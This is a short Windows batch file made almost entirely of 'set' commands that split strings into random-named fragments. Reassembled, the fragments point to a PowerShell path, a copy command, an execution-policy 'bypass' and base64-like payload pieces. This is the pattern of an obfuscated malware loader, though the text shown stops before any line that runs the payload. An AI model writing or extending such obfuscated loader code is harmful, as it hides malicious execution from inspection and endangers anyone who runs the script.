@echo off
set "CGfQeDHGQe=s\"
set "ezLauEPCks=ow"
set "yKMWVTACNT=we"
set "TJcvXeFFem=ws"
set "YjWyEahSIw=.e"
set "CtSXGbQGpQ=he"
set "xuejXuMura=po"
set "yLGxOTojeU=st"
set "OBIHrFuhXw=rS"
set "pNTKhScxZu=do"
set "UJzhTLHqJv=Sy"
set "IHtNrDmlus=ll"
set "ncmybsxutF=y "
set "cTnWlLeyUX= /"
set "oFIjxuaEhI=32"
set "pxCVAvpBde=in"
set "vBKBCVmznr=nd"
set "geDrxeROqU=xe"
set "ywXcyoelUd=\v"
set "tZkyzsaEpG=Wi"
set "nYiqlyMKsW=0\"
set "DyuXdPvTxY=em"
set "sxmmAAoHQZ=rs"
set "nrSlrKkUOT=:\"
set "QKxQoCVGaq=he"
set "OsOKlsozpH=co"
set "WyTOTQZIbk=\W"
set "QMSmJQdNIb=Po"
set "PpPYouiacO=ll"
set "vVPmkvbKNQ=1."
set "VHNCcNAUJy=py"
set "DSfpxUoPNo= C"
set "fzBctjFiHb=we"
set "djAkiANGkT=cd"
set "zpztVfWtIk= %~dp0"
set "PmgdZWPcmf=Disp"
set "OtRaYNjyEO=gth)"
set "xliaKZOztw=.Sec"
set "cCgkeLKMoX=oin "
set "BRTwCHhnIV=OyzA"
set "ovUwuMobYj=.Cop"
set "GkOrKWKTPi=3); "
set "JeSdfGaRhI=$MfU"
set "LFAEDiVDIQ=xFAq"
set "YtXVCMbVuc=Secu"
set "LYlXNWJzqQ=rofi"
set "CXCEiHvwkd=join"
set "SdYbbNYncj=.Mod"
set "FizfQTBdjA=zAgv"
set "iVtQWMtLbd=tryP"
set "WLebJLrRZr=k; }"
set "cbRKEBDDdV=g = "
set "WiILZsbVDa=IzAg"
set "fHjQOULejB== $c"
set "eHDBMLDtAg=Fina"
set "IkBHJLraCz=ct S"
set "kejScWkoCP=($HA"
set "ABmCIWUYGL=bypa"
set "egfkYmFnta=  $N"
set "qHVNDLjMak=:: '"
